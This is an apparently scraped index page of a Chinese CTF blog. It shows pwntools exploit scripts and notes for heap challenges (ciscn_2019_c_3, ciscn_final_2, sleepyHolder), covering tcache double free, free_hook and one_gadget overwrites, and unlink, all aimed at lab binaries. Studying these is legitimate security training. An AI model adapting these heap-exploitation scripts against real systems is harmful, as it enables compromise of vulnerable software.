-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,29798)</span></span><br><span class="line">p=process(<span class="string">&quot;./ciscn_2019_c_3&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">one_gadget=<span class="number">0x4f322</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me the name: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;weapon:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;weapon:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;attack_times: &quot;</span>)</span><br><span class="line"><span class="comment">#arena = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line">arena_96=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">malloc_hook=arena_96-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">gadget=base+one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(free_hook-<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    back(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/11/27/ciscn-2019-c-3/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ciscn-final-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2023/11/02/ciscn-final-2/" target="_blank">ciscn_final_2</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2023/11/02/ciscn-final-2/" class="archive-article-date">
-        <time datetime="2023-11-02T14:07:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-02</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h5 id="例行检查，保护全开，就不放了。"><a href="#例行检查，保护全开，就不放了。" class="headerlink" title="例行检查，保护全开，就不放了。"></a>例行检查，保护全开，就不放了。</h5><h5 id="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"><a href="#add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放" class="headerlink" title="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"></a>add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZX3dv.png" alt="image-20231102221044737"></p>
-<h5 id="存在double-free漏洞"><a href="#存在double-free漏洞" class="headerlink" title="存在double free漏洞"></a>存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXmFe.png" alt="image-20231102221330585"></p>
-<h5 id="可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。"><a href="#可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。" class="headerlink" title="可以double free泄露出堆地址，但是是int类型，接收的话用addr&#x3D;int(p.recvuntil(‘\n’, drop&#x3D;True)),发送的时候用str类型就可在内存里用十六进制存储了。"></a>可以double free泄露出堆地址，但是是int类型，接收的话用addr&#x3D;int(p.recvuntil(‘\n’, drop&#x3D;True)),发送的时候用str类型就可在内存里用十六进制存储了。</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXwuW.png" alt="image-20231102221416344"></p>
-<h5 id="前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆"><a href="#前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆" class="headerlink" title="前戏是先double free改堆头的size，改size容易但是中间得add好几个堆"></a>前戏是先double free改堆头的size，改size容易但是中间得add好几个堆</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;22&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;22&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))-<span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,addr)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x91</span>) <span class="comment">#改掉size</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXhGo.png" alt="image-20231102222318910"></p>
-<h5 id="free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96"><a href="#free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96" class="headerlink" title="free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96"></a>free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXKu5.png" alt="image-20231102223102271"></p>
-<h5 id="接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。"><a href="#接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。" class="headerlink" title="接收并计算地址,至于为什么是 _IO_2_1_stdin _+0x70，应该是它执行时候的地址。"></a>接收并计算地址,至于为什么是 _IO_2_1_stdin _+0x70，应该是它执行时候的地址。</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">malloc_hook=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))-<span class="number">0x70</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">stdin=base+libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]+<span class="number">0x70</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="再次malloc改掉堆地址-然后填充"><a href="#再次malloc改掉堆地址-然后填充" class="headerlink" title="再次malloc改掉堆地址,然后填充"></a>再次malloc改掉堆地址,然后填充</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,stdin)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>) </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXSAX.png" alt="image-20231102223851495"></p>
-<h5 id="再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"><a href="#再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。" class="headerlink" title="再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"></a>再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">chunk0=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))-<span class="number">0x30</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXRWt.png" alt="image-20231102224535159"></p>
-<h5 id="再改堆指针-填充"><a href="#再改堆指针-填充" class="headerlink" title="再改堆指针,填充"></a>再改堆指针,填充</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,chunk0)</span><br><span class="line">add(<span class="number">1</span>,chunk0)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">111</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">666</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/11/02/ZXcgm.png" alt="image-20231102224934035"></p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ciscn_final_2&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26681)</span></span><br><span class="line">context( os = <span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_final_2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your inode number:&#x27;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;22&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;22&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))-<span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,addr)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">malloc_hook=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))-<span class="number">0x70</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">stdin=base+libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]+<span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,stdin)  <span class="comment">###???</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">chunk0=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))-<span class="number">0x30</span></span><br><span class="line">add(<span class="number">1</span>,chunk0)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,chunk0)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">111</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">666</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your message :&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(addr)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/11/02/ciscn-final-2/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sleepyHolder-hitcon-2016" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2023/10/30/sleepyHolder-hitcon-2016/" target="_blank">sleepyHolder_hitcon_2016</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2023/10/30/sleepyHolder-hitcon-2016/" class="archive-article-date">
-        <time datetime="2023-10-30T12:09:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-10-30</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h5 id="例行检查"><a href="#例行检查" class="headerlink" title="例行检查"></a>例行检查</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AS5sW.png"></p>
-<h5 id="add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次"><a href="#add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次" class="headerlink" title="add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次"></a>add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASi8V.png" alt="image-20231031212602644"></p>
-<h5 id="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"><a href="#dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆" class="headerlink" title="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"></a>dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AfdAt.png" alt="image-20231030201715281"></p>
-<h5 id="这还有个edit函数"><a href="#这还有个edit函数" class="headerlink" title="这还有个edit函数"></a>这还有个edit函数</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASteK.png" alt="image-20231030204040558"></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;AAAA&#x27;</span>) <span class="comment">#堆0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;BBBB&#x27;</span>) <span class="comment">#堆1</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;cccc&#x27;</span>) <span class="comment">#堆2</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="因为堆2太大所以free-chunk会放在smallbin里"><a href="#因为堆2太大所以free-chunk会放在smallbin里" class="headerlink" title="因为堆2太大所以free chunk会放在smallbin里"></a>因为堆2太大所以free chunk会放在smallbin里</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Ah5hd.png" alt="image-20231031172733305"></p>
-<h5 id="这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"><a href="#这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink" class="headerlink" title="这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"></a>这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Asbk2.png" alt="image-20231031173201803"></p>
-<h5 id="再申请一次堆"><a href="#再申请一次堆" class="headerlink" title="再申请一次堆"></a>再申请一次堆</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/31/ASOFp.png" alt="image-20231030220449382"></p>
-<h5 id="后面构造fake-chunk-然后dele-2-会unlink"><a href="#后面构造fake-chunk-然后dele-2-会unlink" class="headerlink" title="后面构造fake_chunk,然后dele(2),会unlink"></a>后面构造fake_chunk,然后dele(2),会unlink</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(fd)+p64(bk)+p64(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">dele(<span class="number">2</span>) <span class="comment">#unlink</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/31/As5D5.png" alt="image-20231031173510102"></p>
